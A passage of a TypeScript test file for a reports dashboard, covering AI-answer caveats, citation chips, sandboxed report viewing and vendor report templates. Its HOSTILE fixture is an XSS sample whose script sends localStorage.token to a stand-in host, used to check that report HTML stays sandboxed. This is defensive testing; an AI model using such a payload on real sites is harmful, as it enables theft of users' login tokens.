    expect(askPeriodLabel(OLD)).toBeNull();
    expect(askPeriodLabel({ ...OLD, period_label: null })).toBeNull();
    expect(askPeriodLabel({ ...OLD, period_label: "   " })).toBeNull();
    expect(sourceOf("./Ask.tsx")).not.toMatch(/\ba\.timeframe\b/);
  });
});

describe("askCaveat", () => {
  it("says nothing when the backend flagged nothing", () => {
    expect(askCaveat(OLD)).toBeNull();
    expect(askCaveat({ unverified_numbers: [], omitted: [] })).toBeNull();
    expect(askCaveat({ unverified_numbers: null as unknown as string[], omitted: null as unknown as [] })).toBeNull();
  });

  it("names the numbers it could not match, and says to check them", () => {
    expect(askCaveat({ unverified_numbers: ["$1,234", "45%"] })).toBe(
      "2 figures in this answer could not be matched to the workbook: $1,234, 45%. "
      + "Check them against the sheet before you rely on them.",
    );
    expect(askCaveat({ unverified_numbers: ["$9"] })).toMatch(/^One figure in this answer, \$9, could not/);
  });

  it("lists the first few and counts the rest, rather than printing forty numbers", () => {
    const many = Array.from({ length: 9 }, (_, i) => `$${i + 1}`);
    const note = askCaveat({ unverified_numbers: many })!;
    expect(note).toContain("9 figures");
    expect(note).toContain("$1, $2, $3, $4, $5, $6 and 3 more.");
    expect(note).not.toContain("$7");
  });

  it("names the rows the read left out, per tab", () => {
    expect(askCaveat({ omitted: [{ tab: "Vendor Summary", rows: 312 }] })).toBe(
      "312 rows of Vendor Summary were left out of what was read. The answer cannot speak for them.",
    );
    expect(askCaveat({ omitted: [{ tab: "Leads", rows: 1 }] })).toMatch(/^1 row of Leads was left out/);
    expect(askCaveat({ omitted: [{ tab: "A", rows: 5 }, { tab: "B", rows: 40 }] })).toContain(
      "Some rows were left out of what was read: 5 of A, 40 of B.",
    );
  });

  it("ignores an omission that omitted nothing, or that names no tab", () => {
    expect(askCaveat({ omitted: [{ tab: "Leads", rows: 0 }, { tab: "", rows: 9 }] })).toBeNull();
  });

  it("folds both into ONE note, numbers first", () => {
    const note = askCaveat({ unverified_numbers: ["$9"], omitted: [{ tab: "Leads", rows: 4 }] })!;
    expect(note.indexOf("$9")).toBeLessThan(note.indexOf("Leads"));
    expect(note.match(/rely on them/g)).toHaveLength(1);
  });
});

describe("citeTokens", () => {
  const facts = [factOf("f12"), factOf("f7"), factOf("f3"), factOf("f4")];
  const rebuild = (tokens: ReturnType<typeof citeTokens>) =>
    tokens.map((t) => ("cite" in t ? `[${t.cite.id}]` : t.text)).join("");

  it("turns a marker the answer has a fact for into a chip, leaving the words around it alone", () => {
    expect(citeTokens("Spend was $18,624 [f12], up on June [f7].", facts)).toEqual([
      { text: "Spend was $18,624 " }, { cite: facts[0] },
      { text: ", up on June " }, { cite: facts[1] }, { text: "." },
    ]);
  });

  it("hands the text back whole when there are no facts — an older backend renders as it always did", () => {
    const text = "Spend was $18,624 [f12].";
    expect(citeTokens(text, undefined)).toEqual([{ text }]);
    expect(citeTokens(text, null)).toEqual([{ text }]);
    expect(citeTokens(text, [])).toEqual([{ text }]);
  });

  it("leaves a marker with no fact behind it exactly as written — a chip pointing nowhere is a made-up source", () => {
    expect(citeTokens("Spend [f99] here.", facts)).toEqual([{ text: "Spend [f99] here." }]);
  });

  it("leaves other bracketed text, and markdown links, alone", () => {
    const text = "See [the sheet](https://example.com) and [note to self] and [f12 is wrong].";
    expect(citeTokens(text, facts)).toEqual([{ text }]);
  });

  it("chips every id in a grouped marker, but only when every id is known", () => {
    expect(citeTokens("Both [f3, f4] agree.", facts)).toEqual([
      { text: "Both " }, { cite: facts[2] }, { cite: facts[3] }, { text: " agree." },
    ]);
    expect(citeTokens("Both [f3, f99] agree.", facts)).toEqual([{ text: "Both [f3, f99] agree." }]);
  });

  it("handles a marker at either end of the text, and empty text", () => {
    expect(rebuild(citeTokens("[f12] opens and closes [f7]", facts))).toBe("[f12] opens and closes [f7]");
    expect(citeTokens("", facts)).toEqual([]);
  });

  it("ignores facts with no usable id", () => {
    const junk = [{ id: "", label: "x", tab: "t" }, null as unknown as MrAskFact];
    expect(citeTokens("Spend [f12].", junk)).toEqual([{ text: "Spend [f12]." }]);
  });
});

describe("citeTitle and citedFacts", () => {
  it("says where a figure came from: tab, month, basis", () => {
    expect(citeTitle(factOf("f1"))).toBe("Vendor Summary · July 2026 · month to date");
  });

  it("skips whatever the fact does not carry", () => {
    expect(citeTitle({ tab: "Vendor Summary", month: null, basis: undefined })).toBe("Vendor Summary");
    expect(citeTitle({ tab: "Leads", month: "Q3 2026", basis: "total" })).toBe("Leads · Q3 2026 · total");
  });

  it("lists each cited figure once, in the order it was first cited", () => {
    const a = factOf("f12");
    const b = factOf("f7");
    const tokens = [{ cite: b }, { text: " and " }, { cite: a }, { text: " and again " }, { cite: b }];
    expect(citedFacts(tokens).map((f) => f.id)).toEqual(["f7", "f12"]);
  });
});

describe("an answer from a backend that predates every new field", () => {
  it("draws exactly what it drew before: no badge, no period, no caveat, no chips", () => {
    expect(askProvenance(OLD).ai).toBe(true);
    expect(askPeriodLabel(OLD)).toBeNull();
    expect(askCaveat(OLD)).toBeNull();
    const { summary, recommend } = readNarrative(OLD.answer);
    expect(citeTokens(summary, OLD.facts)).toEqual([{ text: "Vendor A spent $100 [f12]." }]);
    expect(recommend).toBe("hold.");
  });
});

describe("the Ask panel's own words", () => {
  it("no longer claims an answer cannot disagree with the desk", () => {
    // Every connected sheet is read to answer; the desk counts the primary
    // tracker and another sheet only when it was included in the dashboard.
    expect(sourceOf("./Ask.tsx")).not.toContain("cannot disagree with the desk");
    expect(sourceOf("./Ask.tsx")).toContain("only if it was included in the dashboard");
  });
});

/* --------------------------------------------------------------------------
   Report HTML never runs in the app's origin.

   The login token lives in localStorage on this origin, and from Phase 2 any
   team member can upload a report template. So every report document is shown
   as the srcdoc of an iframe whose sandbox grants nothing — inline and in a new
   tab — and no report HTML ever becomes a blob: or data: URL a tab navigates to.
   -------------------------------------------------------------------------- */

const HOSTILE = `<p onclick="steal()">"Q3" & co</p><script>fetch("//x?t="+localStorage.token)</script>`;

/** A blank tab, as much of one as `openReportTab` touches, logging the order
 *  things happen in — the sandbox must be on the frame before its document. */
function fakeTabs() {
  const log: string[] = [];
  type El = {
    tag: string; attrs: Record<string, string>; textContent: string; children: El[];
    parent: El | null; setAttribute(k: string, v: string): void; appendChild(c: El): El;
    remove(): void;
  };
  const el = (tag: string): El => {
    const node: El = {
      tag, attrs: {}, textContent: "", children: [], parent: null,
      setAttribute(k, v) { log.push(`set ${tag}.${k}`); node.attrs[k] = v; },
      appendChild(c) { log.push(`mount ${c.tag}`); c.parent = node; node.children.push(c); return c; },
      remove() { if (node.parent) node.parent.children = node.parent.children.filter((x) => x !== node); },
    };
    return node;
  };
  const doc = { title: "", head: el("head"), body: el("body"), createElement: el };
  const tab = { opener: {} as unknown, document: doc, closed: false, close() { tab.closed = true; } };
  const open = vi.fn((..._args: unknown[]) => tab);
  return { opener: { open } as unknown as TabOpener, open, tab, doc, log };
}

const frameIn = (doc: ReturnType<typeof fakeTabs>["doc"]) =>
  doc.body.children.find((c) => c.tag === "iframe");

describe("the report viewer is a sandboxed iframe", () => {
  it("grants the report nothing — no scripts, no same-origin", () => {
    expect(REPORT_SANDBOX).toBe("");
    expect(REPORT_SANDBOX).not.toMatch(/allow-scripts|allow-same-origin/);
  });

  it("renders the inline viewer with the sandbox attribute and the report as srcdoc, escaped", () => {
    const html = renderToStaticMarkup(createElement(ReportFrame, { html: HOSTILE, title: "Vendor Performance" }));
    expect(html).toMatch(/^<iframe\b/);
    expect(html).toMatch(/\ssandbox=""/);
    expect(html).not.toMatch(/allow-/);
    // HTML attribute names are case-insensitive; React writes this one `srcDoc`.
    expect(html).toMatch(/\ssrcdoc="[^"]*&lt;script&gt;/i);
    expect(html).not.toContain("<script");
    expect(html).toContain('title="Vendor Performance"');
  });

  it("opens the new tab blank, then mounts the report in the same sandbox — sandbox first", () => {
    const { opener, open, tab, doc, log } = fakeTabs();
    const handle = openReportTab("Vendor Performance — September 2026", opener);
    expect(handle).not.toBeNull();
    expect(open).toHaveBeenCalledWith("", "_blank");
    expect(tab.opener).toBeNull();
    expect(doc.title).toBe("Vendor Performance — September 2026");
    expect(frameIn(doc)).toBeUndefined();

    handle!.show(HOSTILE);
    const frame = frameIn(doc)!;
    expect(frame.attrs.sandbox).toBe("");
    expect(frame.attrs.srcdoc).toBe(HOSTILE);
    expect(Object.values(frame.attrs).join(" ")).not.toMatch(/allow-/);
    // The sandbox is read when the frame first navigates: set before its document,
    // and both before it is mounted.
    expect(log.indexOf("set iframe.sandbox")).toBeLessThan(log.indexOf("set iframe.srcdoc"));
    expect(log.indexOf("set iframe.srcdoc")).toBeLessThan(log.indexOf("mount iframe"));
    // Nothing of the report is anywhere else in the tab, which shares this origin.
    expect(doc.head.children.map((c) => c.textContent).join("")).not.toContain("script");
    expect(doc.body.children).toHaveLength(1);
  });

  it("says so when the browser blocks the tab, rather than opening anything else", () => {
    const open = vi.fn(() => null);
    expect(openReportTab("x", { open } as unknown as TabOpener)).toBeNull();
    expect(open).toHaveBeenCalledTimes(1);
  });

  it("closes the tab it opened when the report cannot be fetched", () => {
    const { opener, tab } = fakeTabs();
    openReportTab("x", opener)!.close();
    expect(tab.closed).toBe(true);
  });
});

describe("no blob URL of report HTML is ever opened", () => {
  afterEach(() => { vi.restoreAllMocks(); vi.unstubAllGlobals(); });

  it("fetches both report documents as text, never as an object URL", async () => {
    const objectUrl = vi.spyOn(URL, "createObjectURL");
    const fetchMock = vi.fn(async (_url: string) =>
      new Response(HOSTILE, { status: 200, headers: { "Content-Type": "text/html; charset=utf-8" } }));
    vi.stubGlobal("fetch", fetchMock);

    expect(await mrVendorReportHtml("v1")).toBe(HOSTILE);
    expect(await mrBoardReportHtml("b1")).toBe(HOSTILE);
    expect(fetchMock.mock.calls.map((c) => String(c[0])))
      .toEqual([expect.stringMatching(/\/api\/mr\/vendor-report\/v1\/html$/),
                expect.stringMatching(/\/api\/mr\/board-report\/b1\/html$/)]);
    expect(objectUrl).not.toHaveBeenCalled();
  });

  it("opens a tab only ever on the blank page, never on a blob: or data: URL", () => {
    const objectUrl = vi.spyOn(URL, "createObjectURL");
    const { opener, open } = fakeTabs();
    openReportTab("Board Report", opener)!.show(HOSTILE);
    for (const call of open.mock.calls) expect(String(call[0])).not.toMatch(/^(blob|data):/);
    expect(open.mock.calls).toEqual([["", "_blank"]]);
    expect(objectUrl).not.toHaveBeenCalled();
  });

  it("leaves no HTML-as-object-URL helper in the API client", () => {
    const api = sourceOf("../../../../lib/api.ts");
    expect(api).not.toMatch(/blobUrl\(\s*`[^`]*\/html`/);
    expect(api).not.toContain("mrBoardReportHtmlUrl");
  });

  it("routes every report document in the Reports panel through the sandboxed viewer", () => {
    const reports = sourceOf("./Reports.tsx");
    expect(reports).not.toContain("HtmlUrl");
    expect(reports).not.toContain("createObjectURL");
    expect(reports).not.toMatch(/<iframe\b|srcDoc|dangerouslySetInnerHTML/);
    // The one window.open left is the campaign report's PDF — a PDF, not HTML.
    expect(reports.match(/window\.open\(/g)).toHaveLength(1);
    expect(reports).toMatch(/const url = await mrReportPdfUrl\(id\);\s*window\.open\(url/);
    // Both report kinds that have HTML open through the one shared button…
    expect(reports).toMatch(/read=\{\(\) => mrBoardReportHtml\(report\.id\)\}/);
    expect(reports).toContain("<ReportFrame key={run.id} html={html.data}");
    // …which opens the tab before it awaits anything, so it is not a blocked popup.
    expect(reports).toMatch(/const tab = openReportTab\(title\);[\s\S]{0,400}tab\.show\(await read\(\)\)/);
  });
});

/* --------------------------------------------------------------------------
   Vendor Performance: what the band reads, and what it says.
   -------------------------------------------------------------------------- */

describe("the vendor periods reply", () => {
  afterEach(() => { vi.unstubAllGlobals(); });

  const answer = (status: number, body: unknown) =>
    vi.stubGlobal("fetch", vi.fn(async () =>
      new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } })));

  it("reads a backend that predates the route as switched off — no band, not an error", async () => {
    answer(404, { detail: "Not Found" });
    expect(await mrVendorReportPeriods()).toEqual(MR_VENDOR_OFF);
    expect(MR_VENDOR_OFF.enabled).toBe(false);
  });

  it("passes any other failure through, so 'we never found out' is not 'off'", async () => {
    answer(500, { detail: "boom" });
    await expect(mrVendorReportPeriods()).rejects.toBeInstanceOf(ApiError);
  });

  it("reads the live shape as sent", async () => {
    answer(200, {
      enabled: true, pdf_available: false,
      pdf_unavailable_reason: "PDF export isn't set up on this server yet (RENDERER_URL is unset).",
      months: [{ year_month: "2026-09", label: "September 2026" }, { year_month: "2026-08", label: "August 2026" }],
    });
    const p = await mrVendorReportPeriods();
    expect(p.enabled).toBe(true);
    expect(p.pdf_available).toBe(false);
    expect(p.months.map((m) => m.year_month)).toEqual(["2026-09", "2026-08"]);
  });

  it("defaults every field a skewed backend leaves out: off, PDF asked of the server, no months", () => {
    expect(readVendorPeriods({})).toEqual({
      enabled: false, pdf_available: true, pdf_unavailable_reason: null, months: [], template: null,
    });
    expect(readVendorPeriods(null).enabled).toBe(false);
    expect(readVendorPeriods({ enabled: "yes" }).enabled).toBe(false);
  });

  it("drops a month with no year_month and labels one with no label by its key", () => {
    expect(readVendorPeriods({
      enabled: true, months: [{ label: "Lost" }, null, { year_month: "2026-07" }],
    }).months).toEqual([{ year_month: "2026-07", label: "2026-07" }]);
  });
});

describe("vendor runs on the rail", () => {
  const runs = [
    { id: "v", kind: "vendor_report" as const },
    { id: "b", kind: "board_report" as const },
    { id: "d", kind: "daily_summary" as const },
  ];

  it("hides vendor rows from Already written while the feature is off or unknown", () => {
    expect(visibleRuns(runs, false).map((r) => r.id)).toEqual(["b", "d"]);
    expect(visibleRuns(runs, true).map((r) => r.id)).toEqual(["v", "b", "d"]);
  });

  it("labels the vendor kind and keeps it out of the ten", () => {
    expect(REPORT_META.vendor_report.label).toBe("Vendor Performance");
    expect(isVendorKind("vendor_report")).toBe(true);
    expect(isCampaignKind("vendor_report")).toBe(false);
    expect(isCampaignKind("board_report")).toBe(false);
    expect(isCampaignKind("daily_summary")).toBe(true);
    expect(REPORT_PERIOD_LIST).not.toHaveProperty("vendor_report");
  });
});

describe("vendorMonthPick", () => {
  const months = [{ year_month: "2026-09", label: "September 2026" }, { year_month: "2026-08", label: "August 2026" }];

  it("preselects the newest month", () => expect(vendorMonthPick(months, "")).toBe("2026-09"));
  it("keeps a pick that is still on offer", () => expect(vendorMonthPick(months, "2026-08")).toBe("2026-08"));
  it("falls back to the newest when a re-read drops the pick", () =>
    expect(vendorMonthPick(months, "2026-05")).toBe("2026-09"));
  it("is empty with nothing to pick", () => expect(vendorMonthPick([], "2026-09")).toBe(""));
});

describe("vendorBuiltLine", () => {
  // Built from local time, so the line reads the same in every timezone.
  const at = (h: number, m: number, y = 2026, mo = 9, d = 2) => new Date(y, mo, d, h, m).toISOString();

  it("reads as the spec writes it", () => {
    expect(vendorBuiltLine({
      built_at: at(9, 14), generated_at: at(9, 14), sweep_date: "2026-10-02",
      template: { kind: "builtin" },
    })).toBe("Built 2 Oct 2026, 9:14 am, from the workbook pulled on 2 Oct. Template: built-in.");
  });

  it("names a saved version by its number", () => {
    expect(vendorBuiltLine({
      generated_at: at(21, 5), sweep_date: "2026-10-02",
      template: { kind: "layout", number: 4, id: "tv_4" },
    })).toBe("Built 2 Oct 2026, 9:05 pm, from the workbook pulled on 2 Oct. Template: version 4.");
  });

  it("says when the built-in stood in because the team template failed — the spec's sentence", () => {
    expect(vendorBuiltLine({
      generated_at: at(9, 14), sweep_date: "2026-10-02",
      template: { kind: "builtin", number: null, id: null,
                  fallback: { number: 4, id: "tv_4", reason: "it broke" } },
    })).toBe("Built 2 Oct 2026, 9:14 am, from the workbook pulled on 2 Oct. "
      + "Built with the built-in template because the team template failed.");
  });

  it("keeps a chosen built-in apart from a failed team template", () => {
    expect(vendorBuiltLine({
      generated_at: at(9, 14), sweep_date: "2026-10-02",
      template: { kind: "builtin", override_of: { number: 4, id: "tv_4" } },
    })).toBe("Built 2 Oct 2026, 9:14 am, from the workbook pulled on 2 Oct. "
      + "Template: built-in, chosen instead of version 4.");
  });

  it("writes midnight as 12, and gives the pull's year when it differs", () => {
    expect(vendorBuiltLine({ generated_at: at(0, 30, 2026, 0, 1), sweep_date: "2025-12-31" }))
      .toBe("Built 1 Jan 2026, 12:30 am, from the workbook pulled on 31 Dec 2025.");
  });

  it("says nothing it was not told", () => {
    expect(vendorBuiltLine({ generated_at: "not a date" })).toBe("Built, from the last workbook pull.");
  });
});

describe("missingFigures", () => {
  const eleven = Array.from({ length: 11 }, (_, i) => `Vendor ${i + 1}`);

  it("counts dashes on the page and gives each one's reason as a sentence", () => {
    const read = missingFigures([
      { metric: "show_rate_pct", label: "Show rate", vendors: eleven, reason: "no demos booked yet" },
      { metric: "cost_per_lead", label: "Cost per lead", vendors: "portfolio",
        reason: "a component total is withheld (see above)" },
      { metric: "reconciliation", label: "Roll-up reconciliation", vendors: "portfolio",
        reason: "The roll-up tab wasn't captured in this pull, so vendor totals aren't compared." },
      { metric: "spend", label: "Spend", vendors: ["Avvo"], reason: "not reported on the vendor tab" },
    ]);
    expect(read?.count).toBe(14);
    expect(read?.rows).toEqual([
      "Show rate, 11 vendors: no demos booked yet.",
      "Cost per lead, the portfolio total: a component total is withheld (see above).",
      "Roll-up reconciliation, the portfolio total: the roll-up tab wasn't captured in this pull, so vendor totals aren't compared.",
      "Spend, Avvo: not reported on the vendor tab.",
    ]);
  });

  it("never lower-cases an acronym", () => {
    expect(missingFigures([{ label: "CAC", vendors: "portfolio", reason: "CPL is undefined" }])?.rows)
      .toEqual(["CAC, the portfolio total: CPL is undefined."]);
  });

  it("keeps 'the run did not say' apart from 'nothing is missing'", () => {
    expect(missingFigures(undefined)).toBeNull();
    expect(missingFigures([])).toEqual({ count: 0, rows: [] });
  });
});

describe("the Vendor Performance band's own words", () => {
  const reports = () => sourceOf("./Reports.tsx");

  it("draws the band only when the server says it is on, or when we never found out", () => {
    expect(reports()).toContain("const vendorOn = vendor.data?.enabled === true;");
    expect(reports()).toMatch(/\{vendorBand && \(\s*<VendorBuild/);
    expect(reports()).toContain("visibleRuns(runs.data || [], vendorOn)");
  });

  it("sits above the board report", () => {
    expect(reports().indexOf("<VendorBuild")).toBeLessThan(reports().indexOf("<BoardBuild"));
  });

  it("carries the spec's copy for every state", () => {
    for (const line of [
      'what="Reading which months have vendor figures"',
      "No month has vendor figures yet",
      "It's built from the vendor tabs. Pull the workbook and months appear here.",
      "Build the report",
      '"Building…"',
      "{templateBandLine(load.data?.template ?? null, me)}",
      "is built and filed under Already written.",
      "Pull the workbook, then build again.",
      "Open in a new tab",
      "Download the PDF",
      '"Preparing the PDF…"',
      "Which figures, and why",
    ]) expect(reports(), line).toContain(line);
  });

  it("does not promise a PDF the browser cannot print", () => {
    // A browser prints an iframe only as far as its visible box, so "print it to
    // PDF from your browser" would hand over a cut-off report. The renderer is
    // the fix; until then the line points at what does work.
    expect(reports()).toContain(
      "PDF downloads aren't set up on this server yet. The full report is here, or open it in a new tab to read it full-screen.");
    expect(reports()).not.toMatch(/print it to PDF|from your browser/i);
  });

  it("states the missing-figure count without a cause that is not true of every row", () => {
    // "no target set" and the roll-up reconciliation are not the vendor tabs'
    // doing, so the line gives no cause; each row's own reason is in the disclosure.
    expect(reports()).toMatch(
      /\{n\(gaps\.count\)\} \{gaps\.count === 1 \? "figure shows" : "figures show"\}<\/b>\s*\{" as — \. A dash means missing, not zero\."\}/);
    expect(reports()).not.toContain("vendor tabs don't have");
  });

  it("offers the pull in the empty states", () => {
    expect(reports()).toMatch(/No month has vendor figures yet" action=\{<PullWorkbook/);
    expect(reports()).toMatch(/\{empty && \([\s\S]{0,120}<PullWorkbook pull=\{pull\} \/>/);
  });

  it("offers Change template only where team templates are on, and opens the panel inline", () => {
    expect(reports()).toMatch(/\{templatesOn && \(\s*<p>\s*<button[\s\S]{0,260}aria-controls="mr-team-template"[\s\S]{0,80}Change template/);
    // On when the server says so, or when the read failed (the panel then opens
    // on its Oops) — never when the server said off.
    expect(reports()).toContain("const templatesOn = vendorOn && (templates.data?.enabled === true");
    expect(reports()).toContain('|| (templates.data === null && templates.phase === "failed"));');
    expect(reports()).toMatch(/\{templatesOn && templatesOpen && \(\s*<TemplatePanel/);
    // Inline under the band, above the board report — never a dialog.
    expect(reports().indexOf("<TemplatePanel")).toBeGreaterThan(reports().indexOf("<VendorBuild"));
    expect(reports().indexOf("<TemplatePanel")).toBeLessThan(reports().indexOf("<BoardBuild"));
  });

  it("chooses the build's refusal by its code, and offers the built-in on a failed team template", () => {
    expect(reports()).toContain('if (code === "template_failed")');
    expect(reports()).toContain('code === "empty_month" || (code === null && status === 422)');
    expect(reports()).toContain('what="The team template couldn\'t build this report."');
    expect(reports()).toContain("Nothing was built.");
    expect(reports()).toMatch(/onClick=\{\(\) => void build\(\{ builtin: true \}\)\}[\s\S]{0,80}Build with the built-in template/);
    // No state is picked by matching the server's wording.
    expect(reports()).not.toMatch(/\.message\.(includes|startsWith|match)\(/);
  });

  it("describes the ten in the reader's terms, not the developer's", () => {
    expect(reports()).toContain('note="What each one contains."');
    expect(reports()).not.toContain("In the app being replaced this sits in a title attribute");
  });
});

/* --------------------------------------------------------------------------
   Team report templates: the contract, read with a default for every field.
   Shapes below are the backend's own router tests (test_mr_vendor_report_router.py).
   -------------------------------------------------------------------------- */

const json = (status: number, body: unknown) =>
  new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });

/** The live listing shape, trimmed: the built-in active, one saved version. */
/** The backend tests' layout: a theme colour, three sections. */
const LAYOUT = { theme: { colors: { ink: "#101010" } },
                 sections: [{ type: "header" }, { type: "vendor_scorecard" }, { type: "data_gaps" }] };

/** The built-in's sections as `default_layout` sends them (trimmed). */
const DEFAULT_LAYOUT = { theme: { colors: {} }, sections: [
  { type: "header", title: null, options: {} },
  { type: "benchmark_movers", title: null, options: {} },
  { type: "vendor_scorecard", title: null, options: {} },
  { type: "data_gaps", title: null, options: {} },
  { type: "footer", title: null, options: {} },
] };

const LISTING = {
  enabled: true,
  active: { id: "tv_1", kind: "layout", number: 1, source_kind: "pdf", filename: "Q3 sample.pdf",
            created_by: "priya@legalsoft.com", created_by_name: "Priya Shah",
            created_at: "2026-10-03T08:50:00+00:00",
            set_by: "priya@legalsoft.com", set_by_name: "Priya Shah", set_at: "2026-10-03T08:50:00+00:00" },
  versions: [{ id: "tv_1", kind: "layout", number: 1, source_kind: "pdf", filename: "Q3 sample.pdf",
               created_by: "priya@legalsoft.com", created_by_name: "Priya Shah",
               created_at: "2026-10-03T08:50:00+00:00",
               set_by: "priya@legalsoft.com", set_by_name: "Priya Shah",
               set_at: "2026-10-03T08:50:00+00:00", active: true }],
  placeholders: [
    { token: "{{total_spend}}", title: "Total Spend", description: "Total spend, the portfolio figure (dollars)", kind: "scalar", example: "$2,737" },
    { token: "{{band:header}}", title: "Header band", description: "Header band: a band drawn from this report", kind: "band", example: "September 2" },
    { token: "{{chart:benchmark_movers}}", title: "Biggest movers vs. benchmark", description: "Biggest movers vs. benchmark: a chart drawn from this report", kind: "chart", example: "6 benchmarks charted" },
    { token: "{{table:vendor_scorecard}}", title: "Vendor scorecard", description: "Vendor scorecard: a table drawn from this report", kind: "table", example: "11 vendors + portfolio total" },
    { token: "{{list:standouts}}", title: "Standouts", description: "Standouts: a list drawn from this report", kind: "list", example: "2 standouts" },
    { token: "{{note:data_gaps}}", title: "Basis & data gaps", description: "Basis & data gaps: a note drawn from this report", kind: "note", example: "14 missing figures" },
    { token: "{{band:footer}}", title: "Footer", description: "Footer: a band drawn from this report", kind: "band", example: "Built from the 2026-09-02 pull" },
  ],
  examples_from: { year_month: "2026-09", label: "September 2026" },
  readings_left_today: 10,
  limits: { readings_per_day: 10, readings_reset: "00:00 UTC", pdf_max_bytes: 10485760,
            pdf_max_pages: 10, image_max_bytes: 5242880, image_max_side: 4096, html_max_bytes: 524288 },
  default_layout: DEFAULT_LAYOUT,
};

describe("the template listing", () => {
  afterEach(() => { vi.unstubAllGlobals(); });

  it("reads the live shape", () => {
    const l = readTemplateListing(LISTING);
    expect(l.enabled).toBe(true);
    expect(l.active?.number).toBe(1);
    expect(l.versions.map((v) => [v.number, v.active])).toEqual([[1, true]]);
    expect(l.placeholders.find((p) => p.token === "{{total_spend}}")?.example).toBe("$2,737");
    expect(l.examples_from).toEqual({ year_month: "2026-09", label: "September 2026" });
    expect(l.readings_left_today).toBe(10);
    expect(l.readings_per_day).toBe(10);
    expect(l.default_layout?.sections.map((s) => s.type))
      .toEqual(["header", "benchmark_movers", "vendor_scorecard", "data_gaps", "footer"]);
    expect(l.placeholders.find((p) => p.token === "{{table:vendor_scorecard}}")?.title).toBe("Vendor scorecard");
    expect([l.active?.created_by_name, l.active?.set_by_name]).toEqual(["Priya Shah", "Priya Shah"]);
  });

  it("reads names and titles a backend older than them leaves out as null — the email stands in", () => {
    const old = readTemplateListing({ ...LISTING,
      active: { ...LISTING.active, created_by_name: undefined, set_by_name: undefined },
      placeholders: [{ token: "{{total_spend}}", description: "d", kind: "scalar", example: null }],
      default_layout: undefined });
    expect([old.active?.created_by_name, old.active?.set_by_name]).toEqual([null, null]);
    expect(old.placeholders[0].title).toBeNull();
    expect(old.default_layout).toBeNull();
  });

  it("hides everything when the server says off, or says nothing", () => {
    expect(readTemplateListing({ enabled: false, active: null, versions: [] })).toEqual(MR_TEMPLATES_OFF);
    expect(readTemplateListing({})).toEqual(MR_TEMPLATES_OFF);
    expect(readTemplateListing(null)).toEqual(MR_TEMPLATES_OFF);
  });

  it("defaults every field a skewed backend leaves out", () => {
    const l = readTemplateListing({ enabled: true });
    expect(l).toEqual({ ...MR_TEMPLATES_OFF, enabled: true });
    // Absent examples are null, never invented; absent readings are unknown, never zero.
    expect(l.examples_from).toBeNull();
    expect(l.readings_left_today).toBeNull();
  });

  it("drops a version with no id and a placeholder with no token, rather than guessing", () => {
    const l = readTemplateListing({ ...LISTING, versions: [{ number: 2 }, LISTING.versions[0]],
                                    placeholders: [{ description: "x" }, LISTING.placeholders[0]] });
    expect(l.versions.map((v) => v.id)).toEqual(["tv_1"]);
    expect(l.placeholders.map((p) => p.token)).toEqual(["{{total_spend}}"]);
  });

  it("reads a backend that predates the route as off, and passes any other failure through", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => json(404, { detail: "Not Found" })));
    expect(await mrReportTemplates()).toEqual(MR_TEMPLATES_OFF);
    vi.stubGlobal("fetch", vi.fn(async () => json(500, { detail: "boom" })));
    await expect(mrReportTemplates()).rejects.toBeInstanceOf(ApiError);
  });
});

describe("the periods' template line", () => {
  it("is null from a backend older than templates — where every build is the built-in", () => {
    expect(readVendorPeriods({ enabled: true }).template).toBeNull();
  });

  it("keeps 'the store could not be read' apart from the built-in", () => {
    expect(readVendorPeriods({ enabled: true, template: { kind: null, number: null } }).template)
      .toEqual({ kind: null, number: null, set_by: null, set_by_name: null, set_at: null });
  });

  it("reads the live shape, with the name to show", () => {
    expect(readVendorPeriods({ enabled: true, template: {
      kind: "layout", number: 4, set_by: "priya@legalsoft.com", set_by_name: "Priya Shah",
      set_at: "2026-10-03T08:50:00+00:00" } }).template)
      .toEqual({ kind: "layout", number: 4, set_by: "priya@legalsoft.com", set_by_name: "Priya Shah",
                 set_at: "2026-10-03T08:50:00+00:00" });
  });
});

describe("reading a sample", () => {
  afterEach(() => { vi.unstubAllGlobals(); });

  it("reads a PDF's layout, its unmatched sections and its preview", () => {
    const r = readTemplateReading({
      source_kind: "pdf", upload: { filename: "q3 sample.html", kind: "pdf", size: 40, sha256: "x" },
      layout: LAYOUT, unsupported: [{ title: "Social reach", description: "a follower chart" }],
      matched_count: 3, notes: [], preview_html: "<!DOCTYPE html><p>x</p>",
      preview_unavailable_reason: null, readings_left_today: 9,
    });
    expect(r.source_kind).toBe("pdf");
    if (r.source_kind === "html") throw new Error("read as HTML");
    expect(r.layout.sections.map((s) => s.type)).toEqual(["header", "vendor_scorecard", "data_gaps"]);
    expect(r.layout.theme).toEqual({ colors: { ink: "#101010" } });
    expect(r.unsupported).toEqual([{ title: "Social reach", description: "a follower chart" }]);
    expect(r.matched_count).toBe(3);
    expect(r.readings_left_today).toBe(9);
  });

  it("reads an HTML check, keeps only what was removed, and never offers a save it was not told of", () => {
    const r = readTemplateReading({
      source_kind: "html", sanitized_html: "", can_save: undefined,
      errors: [{ line: 14, placeholder: "{{totl_spend}}", message: "unknown", suggestion: "{{total_spend}}" }],
      removed: { scripts: 1, handlers: 0, comments: 2 }, placeholders_used: [],
      upload: { filename: "t.html", kind: "html", size: 9 }, preview_html: null,
      preview_unavailable_reason: "Fix the errors listed to see a preview.",
    });
    if (r.source_kind !== "html") throw new Error("not read as HTML");
    expect(r.can_save).toBe(false);
    expect(r.sanitized_html).toBeNull();
    expect(r.removed).toEqual({ scripts: 1, comments: 2 });
    expect(r.errors[0]).toEqual({ line: 14, placeholder: "{{totl_spend}}", message: "unknown",
                                  suggestion: "{{total_spend}}" });
  });

  it("refuses an answer it cannot read rather than guessing a layout", () => {
    expect(() => readTemplateReading({ source_kind: "pdf" })).toThrow(/Nothing was saved/);
    expect(() => readTemplateReading({})).toThrow(/Nothing was saved/);
  });

  it("reads why a preview is missing as a code to act on, null from an older backend", () => {
    const at = (code?: string) => readTemplateReading({
      source_kind: "pdf", layout: LAYOUT, preview_html: null,
      preview_unavailable_reason: "There are no vendor figures yet.", preview_unavailable_code: code });
    expect(at("no_data").preview_unavailable_code).toBe("no_data");
    expect(at("store_unavailable").preview_unavailable_code).toBe("store_unavailable");
    expect(at("template_failed").preview_unavailable_code).toBe("template_failed");
    expect(at(undefined).preview_unavailable_code).toBeNull();
  });

